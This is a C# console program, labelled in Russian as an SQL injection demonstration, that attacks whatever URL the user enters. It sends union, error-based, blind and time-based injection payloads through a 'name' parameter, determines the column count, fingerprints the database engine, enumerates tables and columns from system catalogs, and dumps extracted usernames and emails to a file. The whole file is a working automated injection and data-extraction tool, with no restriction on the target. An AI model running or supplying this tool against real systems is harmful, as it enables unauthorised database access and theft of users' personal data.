using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.IO;

namespace SqlInjectionDemo
{
    enum DatabaseType
    {
        MySql,
        SQLite,
        MsSql,
        PostgreSql
    }

    enum AttackType
    {
        Union,
        UnionTable,
        UnionColumn,
        Error,
        Blind,
        Time
    }

    class Program
    {
        private static readonly HttpClient Client = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
        private static readonly Dictionary<DatabaseType, int> DbSuccessScores = new Dictionary<DatabaseType, int>
        {
            { DatabaseType.MySql, 0 },
            { DatabaseType.SQLite, 0 },
            { DatabaseType.MsSql, 0 },
            { DatabaseType.PostgreSql, 0 }
        };

        private static readonly List<string> TableWordlist = new List<string>
        {
            "users", "admin", "posts", "comments", "products", "orders", "customers",
            "employees", "accounts", "profiles", "sessions", "logs", "settings"
        };

        private static readonly List<string> ColumnWordlist = new List<string>
        {
            "id", "username", "password", "email", "name", "first_name", "last_name",
            "role", "is_admin", "created_at", "updated_at", "phone", "address"
        };

        private static readonly string LogFilePath = "log.txt";
        private static readonly string DumpFilePath = "dump.txt";
        private static readonly HashSet<string> KnownUsers = new HashSet<string> { "admin", "user1", "user2" };
        private static readonly HashSet<string> FoundTables = new HashSet<string>();
        private static readonly List<string> ExtractedData = new List<string>();
        private static int ColumnCount = 0;
        private static DatabaseType? ConfirmedDbType = null;

        static async Task Main(string[] args)
        {
            Console.WriteLine("=== Демонстрация SQL-инъекций ===");
            Console.Write("Введите URL эндпоинта (например, http://localhost:8081/search.php): ");
            string url = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(url))
            {
                LogError("URL не указан. Завершение.", true);
                return;
            }

            File.WriteAllText(LogFilePath, $"[{DateTime.Now}] Начало тестирования URL: {url}\n\n");
            if (File.Exists(DumpFilePath)) File.WriteAllText(DumpFilePath, "");
            FoundTables.Clear();
            ExtractedData.Clear();
            ConfirmedDbType = null;

            LogInfo("Запуск тестирования всех атак...", true);

            try
            {
                await TestAllAttacks(url);
                DetermineDatabaseType();
                LogExtractedData();
                DumpTableSummary();
            }
            catch (Exception ex)
            {
                LogError($"Критическая ошибка: {ex.Message}", true);
            }
        }

        static async Task TestAllAttacks(string url)
        {
            foreach (DatabaseType dbType in Enum.GetValues(typeof(DatabaseType)))
            {
                if (ConfirmedDbType != null && ConfirmedDbType != dbType)
                {
                    LogInfo($"Пропуск {dbType}: Обнаружена БД {ConfirmedDbType}.", true);
                    continue;
                }
                LogInfo($"Тестирование БД: {dbType}", true);
                ColumnCount = await DetermineColumnCount(dbType, url);
                foreach (AttackType attackType in Enum.GetValues(typeof(AttackType)))
                {
                    try
                    {
                        LogInfo($"Запуск атаки {attackType} для {dbType}", false);
                        await ExecuteAttack(dbType, attackType, url);
                    }
                    catch (Exception ex)
                    {
                        LogError($"Ошибка при выполнении атаки {attackType} для {dbType}: {ex.Message}", true);
                    }
                }
            }
        }

        static async Task<int> DetermineColumnCount(DatabaseType dbType, string url)
        {
            LogInfo("Определение количества столбцов для Union-атак.", true);
            int maxColumns = 10;
            for (int i = 1; i <= maxColumns; i++)
            {
                string orderByPayload = dbType == DatabaseType.MySql || dbType == DatabaseType.PostgreSql
                    ? $"admin' ORDER BY {i} -- "
                    : $"admin' ORDER BY {i} --";
                string unionPayload = dbType == DatabaseType.MySql || dbType == DatabaseType.PostgreSql
                    ? $"admin' UNION SELECT {string.Join(",", Enumerable.Repeat("'test'", i))} -- "
                    : $"admin' UNION SELECT {string.Join(",", Enumerable.Repeat("'test'", i))} --";
                string fullUrlOrderBy = $"{url}?name={Uri.EscapeDataString(orderByPayload)}";
                string fullUrlUnion = $"{url}?name={Uri.EscapeDataString(unionPayload)}";
                LogDebug($"Проверка {i} столбцов (ORDER BY: {orderByPayload}, UNION: {unionPayload})");

                try
                {
                    HttpResponseMessage responseOrderBy = await Client.GetAsync(fullUrlOrderBy);
                    string contentOrderBy = await responseOrderBy.Content.ReadAsStringAsync();
                    if (contentOrderBy.Contains("error") || contentOrderBy.Contains("SQL"))
                        continue;

                    HttpResponseMessage responseUnion = await Client.GetAsync(fullUrlUnion);
                    string content = await responseUnion.Content.ReadAsStringAsync();
                    if (!content.Contains("error") && !content.Contains("SQL") && !content.Contains("Cardinality") && content.Contains("test"))
                    {
                        LogSuccess($"Найдено количество столбцов: {i}", true);
                        return i;
                    }
                }
                catch (Exception ex)
                {
                    LogWarning($"Ошибка при проверке {i} столбцов: {ex.Message}. Продолжаем.", false);
                }
            }
            LogWarning("Не удалось определить количество столбцов, предполагаем 1.", true);
            return 1;
        }

        static async Task ExecuteAttack(DatabaseType dbType, AttackType attackType, string url)
        {
            var payloads = attackType == AttackType.UnionTable || attackType == AttackType.UnionColumn
                ? GeneratePayloads(dbType, attackType)
                : GetPayloads(dbType, attackType);

            if (!payloads.Any())
            {
                LogWarning($"Нет пейлоадов для {attackType} и {dbType}. {(attackType == AttackType.UnionColumn && !FoundTables.Any() ? "Причина: нет найденных таблиц." : "")}", true);
                return;
            }

            foreach (var payload in payloads)
            {
                if (string.IsNullOrEmpty(payload))
                {
                    LogWarning($"Пейлоад для {attackType} и {dbType} пустой.", false);
                    continue;
                }
                await SendRequestWithRetry(dbType, attackType, url, payload);
            }
        }

        static async Task SendRequestWithRetry(DatabaseType dbType, AttackType attackType, string url, string payload, int retryCount = 2)
        {
            string fullUrl = $"{url}?name={Uri.EscapeDataString(payload)}";
            LogInfo($"[{attackType} для {dbType}] Проверка пейлоада: {payload}", false);

            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            try
            {
                HttpResponseMessage response = await Client.GetAsync(fullUrl);
                stopwatch.Stop();
                string content = await response.Content.ReadAsStringAsync();
                AnalyzeResult(dbType, attackType, content, stopwatch.ElapsedMilliseconds, payload);
            }
            catch (TaskCanceledException ex)
            {
                stopwatch.Stop();
                LogWarning($"Таймаут при выполнении {attackType} для {dbType} (пейлоад: {payload}). Время: {stopwatch.ElapsedMilliseconds} мс", true);
                if (attackType == AttackType.Time && retryCount > 0)
                {
                    string lighterPayload = GetLighterTimePayload(dbType, payload);
                    if (!string.IsNullOrEmpty(lighterPayload))
                    {
                        LogInfo($"Повторная попытка с лёгким пейлоадом: {lighterPayload}", false);
                        await SendRequestWithRetry(dbType, attackType, url, lighterPayload, retryCount - 1);
                    }
                }
            }
            catch (Exception ex)
            {
                stopwatch.Stop();
                LogError($"Ошибка при выполнении {attackType} для {dbType} (пейлоад: {payload}): {ex.Message}", true);
            }
        }

        static string GetLighterTimePayload(DatabaseType dbType, string originalPayload)
        {
            switch (dbType)
            {
                case DatabaseType.MySql:
                    return originalPayload.Contains("SLEEP") ? "admin' AND 1=1 -- " : null;
                case DatabaseType.PostgreSql:
                    return originalPayload.Contains("PG_SLEEP") ? "admin' AND 1=1 -- " : null;
                case DatabaseType.MsSql:
                    return originalPayload.Contains("WAITFOR") ? "admin' AND 1=1 -- " : null;
                case DatabaseType.SQLite:
                    return "admin' AND 1=1 -- ";
                default:
                    return null;
            }
        }

        static void AnalyzeResult(DatabaseType dbType, AttackType attackType, string content, long elapsedMs, string payload)
        {
            bool success = false;
            string consoleMessage = $"Результат {attackType} для {dbType}: ";
            string logMessage = $"[{DateTime.Now}] Результат {attackType} для {dbType}\n" +
                               $"Пейлоад: {payload}\n" +
                               $"Время ответа: {elapsedMs} мс\n" +
                               $"Контент ответа:\n{content}\n";

            // Detect database type from error
            DatabaseType? detectedDbType = DetectDatabaseType(content);
            if (detectedDbType != null && detectedDbType != dbType)
            {
                LogWarning($"Обнаружена БД {detectedDbType} вместо {dbType} в ответе.", true);
                ConfirmedDbType = detectedDbType;
            }
            bool hasSqlError = content.Contains("error") || content.Contains("SQL") || content.Contains("Cardinality") || content.Contains("syntax");
            bool isDbMatch = detectedDbType == null || detectedDbType == dbType;

            // Extract user data using regex
            var userDataMatches = Regex.Matches(content, @"(ID:\s*\d+|Username:\s*\w+|Email:\s*[\w@.]+)");
            if (userDataMatches.Any())
            {
                string extracted = string.Join("\n", userDataMatches.Select(m => m.Value));
                ExtractedData.Add($"[{attackType} для {dbType}] Извлечённые данные: {extracted}");
                logMessage += $"Извлечённые данные:\n{extracted}\n";
                DumpUserData(extracted, attackType, dbType);
            }

            // Extract table names for UnionTable
            var tableMatches = Regex.Matches(content, @"\b[a-zA-Z_]\w{2,31}\b(?<!ID|Username|password|Email|Name)");
            var foundTableNames = tableMatches.Select(m => m.Value)
                                              .Where(t => TableWordlist.Contains(t, StringComparer.OrdinalIgnoreCase) && !KnownUsers.Contains(t))
                                              .Distinct()
                                              .ToList();

            switch (attackType)
            {
                case AttackType.Union:
                    consoleMessage += userDataMatches.Any() ? "Успех: Данные извлечены!" : "Не сработало.";
                    logMessage += userDataMatches.Any() ? "Успех: Данные извлечены!\n" : "Не сработало.\n";
                    if (userDataMatches.Any() && isDbMatch)
                    {
                        success = true;
                        DbSuccessScores[dbType] += 2;
                    }
                    break;
                case AttackType.UnionTable:
                    string tableName = ExtractNameFromPayload(payload);
                    bool tableFound = !hasSqlError && (foundTableNames.Any() || (!string.IsNullOrEmpty(tableName) && content.Contains(tableName)));
                    if (tableFound && isDbMatch)
                    {
                        success = true;
                        string tables = foundTableNames.Any() ? string.Join(", ", foundTableNames) : tableName;
                        consoleMessage += $"Обнаружены таблицы: {tables}";
                        logMessage += $"Обнаружены таблицы: {tables}\n";
                        if (!string.IsNullOrEmpty(tableName))
                            FoundTables.Add(tableName);
                        if (foundTableNames.Any())
                            FoundTables.UnionWith(foundTableNames);
                        DbSuccessScores[dbType] += 3;
                    }
                    else
                    {
                        consoleMessage += hasSqlError ? "Ошибка SQL при попытке извлечения таблиц." : "Таблицы не найдены.";
                        logMessage += hasSqlError ? "Ошибка SQL при попытке извлечения таблиц.\n" : "Таблицы не найдены.\n";
                    }
                    break;
                case AttackType.UnionColumn:
                    if (!FoundTables.Any())
                    {
                        consoleMessage += "Пропущено: нет найденных таблиц.";
                        logMessage += "Пропущено: нет найденных таблиц.\n";
                        break;
                    }
                    string columnName = ExtractNameFromPayload(payload);
                    if (!hasSqlError && content.Contains(columnName) && ColumnWordlist.Contains(columnName) && !KnownUsers.Contains(columnName) && isDbMatch)
                    {
                        success = true;
                        consoleMessage += $"Обнаружены столбцы: {columnName}";
                        logMessage += $"Обнаружены столбцы: {columnName}\n";
                        DbSuccessScores[dbType] += 3;
                    }
                    else
                    {
                        consoleMessage += "Столбцы не найдены.";
                        logMessage += "Столбцы не найдены.\n";
                    }
                    break;
                case AttackType.Error:
                    consoleMessage += hasSqlError && isDbMatch ? "Успех: Обнаружена ошибка SQL!" : "Не удалось вызвать ошибку.";
                    logMessage += hasSqlError && isDbMatch ? "Успех: Обнаружена ошибка SQL!\n" : "Не удалось вызвать ошибку.\n";
                    if (hasSqlError && isDbMatch)
                    {
                        success = true;
                        DbSuccessScores[dbType] += 1;
                    }
                    break;
                case AttackType.Blind:
                    consoleMessage += userDataMatches.Any() || content.Contains("найден") || content.Contains("ID:") || content.Contains("Username:") ? "Успех: Пользователь найден!" : "Пользователь не найден.";
                    logMessage += userDataMatches.Any() || content.Contains("найден") || content.Contains("ID:") || content.Contains("Username:") ? "Успех: Пользователь найден!\n" : "Пользователь не найден.\n";
                    if ((userDataMatches.Any() || content.Contains("найден") || content.Contains("ID:") || content.Contains("Username:")) && isDbMatch)
                    {
                        success = true;
                        DbSuccessScores[dbType] += 1;
                    }
                    break;
                case AttackType.Time:
                    consoleMessage += elapsedMs > 1000 && elapsedMs < 5000 ? "Успех: Задержка обнаружена!" : "Задержка не обнаружена.";
                    logMessage += $"Время ответа: {elapsedMs} мс\n" +
                                  (elapsedMs > 1000 && elapsedMs < 5000 ? "Успех: Задержка обнаружена!\n" : "Задержка не обнаружена.\n");
                    if (elapsedMs > 1000 && elapsedMs < 5000 && isDbMatch)
                    {
                        success = true;
                        DbSuccessScores[dbType] += 2;
                    }
                    break;
            }

            logMessage += "----------------------------------------\n";
            File.AppendAllText(LogFilePath, logMessage);

            if (success)
                LogSuccess(consoleMessage, true);
            else
                LogWarning(consoleMessage, true);
        }

        static DatabaseType? DetectDatabaseType(string content)
        {
            if (content.Contains("MySQL") || content.Contains("MariaDB"))
                return DatabaseType.MySql;
            if (content.Contains("PostgreSQL") || content.Contains("PG"))
                return DatabaseType.PostgreSql;
            if (content.Contains("SQL Server") || content.Contains("MSSQL"))
                return DatabaseType.MsSql;
            if (content.Contains("SQLite"))
                return DatabaseType.SQLite;
            return null;
        }

        static void DumpUserData(string data, AttackType attackType, DatabaseType dbType)
        {
            string dumpEntry = $"[{DateTime.Now}] [{attackType} для {dbType}]\n{data}\n----------------------------------------\n";
            File.AppendAllText(DumpFilePath, dumpEntry);
        }

        static void DumpTableSummary()
        {
            if (FoundTables.Any())
            {
                string dumpEntry = $"[{DateTime.Now}] [Обнаруженные таблицы]\n" +
                                  string.Join("\n", FoundTables) +
                                  "\n----------------------------------------\n";
                File.AppendAllText(DumpFilePath, dumpEntry);
                LogSuccess("Суммаризация таблиц сохранена в dump.txt.", true);
            }
        }

        static string ExtractNameFromPayload(string payload)
        {
            var match = Regex.Match(payload, @"'(\w+)',\s*'table|column'");
            return match.Success ? match.Groups[1].Value : string.Empty;
        }

        static void DetermineDatabaseType()
        {
            LogInfo("Определение типа БД...", true);
            string logMessage = $"[{DateTime.Now}] Определение типа БД\n";
            var bestDb = ConfirmedDbType ?? DatabaseType.MySql;
            int maxScore = 0;

            foreach (var pair in DbSuccessScores)
            {
                LogInfo($"БД {pair.Key}: {pair.Value} баллов", false);
                logMessage += $"БД {pair.Key}: {pair.Value} баллов\n";
                if (pair.Value > maxScore)
                {
                    maxScore = pair.Value;
                    bestDb = pair.Key;
                }
            }

            string result = ConfirmedDbType != null
                ? $"Подтверждён тип БД: {ConfirmedDbType} (по ошибке сервера)"
                : maxScore > 0 ? $"Наиболее вероятный тип БД: {bestDb} (баллы: {maxScore})" : "Тип БД не определён.";
            logMessage += $"{result}\n----------------------------------------\n";

            File.AppendAllText(LogFilePath, logMessage);

            if (maxScore > 0 || ConfirmedDbType != null)
                LogSuccess(result, true);
            else
                LogWarning(result, true);
        }

        static void LogExtractedData()
        {
            if (ExtractedData.Any())
            {
                string logMessage = $"[{DateTime.Now}] Извлечённые данные:\n";
                foreach (var data in ExtractedData)
                {
                    logMessage += $"{data}\n";
                }
                logMessage += "----------------------------------------\n";
                File.AppendAllText(LogFilePath, logMessage);
                LogSuccess("Извлечённые данные сохранены в лог и dump.txt.", true);
            }
            else
            {
                LogWarning("Данные не были извлечены.", true);
            }
        }

        static List<string> GeneratePayloads(DatabaseType dbType, AttackType attackType)
        {
            var payloads = new List<string>();
            if (attackType == AttackType.UnionTable)
            {
                payloads.Add(GenerateAllTablesPayload(dbType));
                payloads.Add(GenerateFallbackTablePayload(dbType));
                foreach (var table in TableWordlist)
                {
                    string payload = GenerateTablePayload(dbType, table);
                    if (!string.IsNullOrEmpty(payload))
                        payloads.Add(payload);
                }
            }
            else if (attackType == AttackType.UnionColumn)
            {
                if (!FoundTables.Any())
                {
                    LogWarning("Нет таблиц для UnionColumn, пропускаем генерацию пейлоадов.", false);
                    return payloads;
                }
                foreach (var table in FoundTables)
                {
                    foreach (var column in ColumnWordlist)
                    {
                        string payload = GenerateColumnPayload(dbType, table, column);
                        if (!string.IsNullOrEmpty(payload))
                            payloads.Add(payload);
                    }
                }
            }
            return payloads;
        }

        static string GenerateAllTablesPayload(DatabaseType dbType)
        {
            string selectPayload = ColumnCount == 1 ? "table_name" : $"NULL,table_name";
            switch (dbType)
            {
                case DatabaseType.MySql:
                    return $"admin' UNION SELECT {selectPayload} FROM information_schema.tables -- ";
                case DatabaseType.PostgreSql:
                    return $"admin' UNION SELECT {selectPayload} FROM information_schema.tables WHERE table_schema = 'public' -- ";
                case DatabaseType.MsSql:
                    return $"admin' UNION SELECT {selectPayload} FROM sys.tables -- ";
                case DatabaseType.SQLite:
                    return $"admin' UNION SELECT {selectPayload} FROM sqlite_master WHERE type='table' -- ";
                default:
                    return null;
            }
        }

        static string GenerateTablePayload(DatabaseType dbType, string tableName)
        {
            string selectPayload = ColumnCount == 1 ? "table_name" : $"NULL,table_name";
            switch (dbType)
            {
                case DatabaseType.MySql:
                    return $"admin' UNION SELECT {selectPayload} FROM information_schema.tables WHERE table_name = '{tableName}' -- ";
                case DatabaseType.PostgreSql:
                    return $"admin' UNION SELECT {selectPayload} FROM information_schema.tables WHERE table_schema = 'public' AND table_name = '{tableName}' -- ";
                case DatabaseType.MsSql:
                    return $"admin' UNION SELECT {selectPayload} FROM sys.tables WHERE name = '{tableName}' -- ";
                case DatabaseType.SQLite:
                    return $"admin' UNION SELECT {selectPayload} FROM sqlite_master WHERE type='table' AND name = '{tableName}' -- ";
                default:
                    return null;
            }
        }

        static string GenerateColumnPayload(DatabaseType dbType, string tableName, string columnName)
        {
            string selectPayload = ColumnCount == 1 ? "column_name" : $"NULL,column_name";
            switch (dbType)
            {
                case DatabaseType.MySql:
                    return $"admin' UNION SELECT {selectPayload} FROM information_schema.columns WHERE table_name = '{tableName}' AND column_name = '{columnName}' -- ";
                case DatabaseType.PostgreSql:
                    return $"admin' UNION SELECT {selectPayload} FROM information_schema.columns WHERE table_schema = 'public' AND table_name = '{tableName}' AND column_name = '{columnName}' -- ";
                case DatabaseType.MsSql:
                    return $"admin' UNION SELECT {selectPayload} FROM sys.columns WHERE object_id = OBJECT_ID('{tableName}') AND name = '{columnName}' -- ";
                case DatabaseType.SQLite:
                    return $"admin' UNION SELECT {selectPayload} FROM pragma_table_info('{tableName}') WHERE name = '{columnName}' -- ";
                default:
                    return null;
            }
        }

        static string GenerateFallbackTablePayload(DatabaseType dbType)
        {
            switch (dbType)
            {
                case DatabaseType.MySql:
                    return "admin' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users') -- ";
                case DatabaseType.PostgreSql:
                    return "admin' AND (SELECT 1 FROM information_schema.tables WHERE table_schema = 'public' AND table_name = 'users') -- ";
                case DatabaseType.MsSql:
                    return "admin' AND (SELECT 1 FROM sys.tables WHERE name = 'users') -- ";
                case DatabaseType.SQLite:
                    return "admin' AND (SELECT 1 FROM sqlite_master WHERE type='table' AND name='users') -- ";
                default:
                    return null;
            }
        }

        static List<string> GetPayloads(DatabaseType dbType, AttackType attackType)
        {
            var payloads = new List<string>();
            string unionSelectPayload = ColumnCount == 1 ? "username" : $"NULL,username";
            switch (attackType)
            {
                case AttackType.Union:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                        case DatabaseType.PostgreSql:
                            payloads.Add($"admin' UNION SELECT {unionSelectPayload} FROM users -- ");
                            payloads.Add($"admin' UNION SELECT {unionSelectPayload} FROM users WHERE username = 'admin' -- ");
                            break;
                        case DatabaseType.MsSql:
                            payloads.Add($"admin' UNION SELECT {unionSelectPayload} FROM users -- ");
                            payloads.Add($"admin' UNION SELECT {unionSelectPayload} FROM users WHERE username = 'admin' -- ");
                            break;
                        case DatabaseType.SQLite:
                            payloads.Add($"admin' UNION SELECT {unionSelectPayload} FROM users -- ");
                            payloads.Add($"admin' UNION SELECT {unionSelectPayload} FROM users WHERE username = 'admin' -- ");
                            break;
                    }
                    break;
                case AttackType.Error:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                            payloads.Add("admin' AND 1=CAST('a' AS UNSIGNED) -- ");
                            payloads.Add("admin' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users') -- ");
                            payloads.Add("admin' AND SUBSTRING((SELECT @@version), 1, 0) -- ");
                            break;
                        case DatabaseType.PostgreSql:
                            payloads.Add("admin' AND 1=CAST('a' AS INTEGER) -- ");
                            payloads.Add("admin' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users') -- ");
                            break;
                        case DatabaseType.MsSql:
                            payloads.Add("admin' AND 1=CAST('a' AS INT) -- ");
                            payloads.Add("admin' AND (SELECT 1 FROM sys.tables WHERE name = 'users') -- ");
                            break;
                        case DatabaseType.SQLite:
                            payloads.Add("admin' AND 1=CAST('a' AS INTEGER) -- ");
                            payloads.Add("admin' AND (SELECT 1 FROM sqlite_master WHERE type='table' AND name='users') -- ");
                            break;
                    }
                    break;
                case AttackType.Blind:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                        case DatabaseType.PostgreSql:
                            payloads.Add("admin' AND 1=1 -- ");
                            payloads.Add("admin' AND 1=2 -- ");
                            break;
                        case DatabaseType.MsSql:
                            payloads.Add("admin' AND 1=1 -- ");
                            payloads.Add("admin' AND 1=2 -- ");
                            break;
                        case DatabaseType.SQLite:
                            payloads.Add("admin' AND 1=1 -- ");
                            payloads.Add("admin' AND 1=2 -- ");
                            break;
                    }
                    break;
                case AttackType.Time:
                    switch (dbType)
                    {
                        case DatabaseType.MySql:
                            payloads.Add("admin' AND 1=1 -- "); // Avoid SLEEP due to timeouts
                            break;
                        case DatabaseType.PostgreSql:
                            payloads.Add("admin' AND 1=1 -- ");
                            break;
                        case DatabaseType.MsSql:
                            payloads.Add("admin' AND 1=1 -- ");
                            break;
                        case DatabaseType.SQLite:
                            payloads.Add("admin' AND 1=1 -- ");
                            break;
                    }
                    break;
            }
            return payloads;
        }

        static void LogInfo(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[INFO] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [INFO] {message}\n");
        }

        static void LogSuccess(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[SUCCESS] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [SUCCESS] {message}\n");
        }

        static void LogWarning(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine($"[WARNING] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [WARNING] {message}\n");
        }

        static void LogError(string message, bool toConsole)
        {
            if (toConsole)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[ERROR] {message}");
                Console.ResetColor();
            }
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [ERROR] {message}\n");
        }

        static void LogDebug(string message)
        {
            File.AppendAllText(LogFilePath, $"[{DateTime.Now}] [DEBUG] {message}\n");
        }
    }
}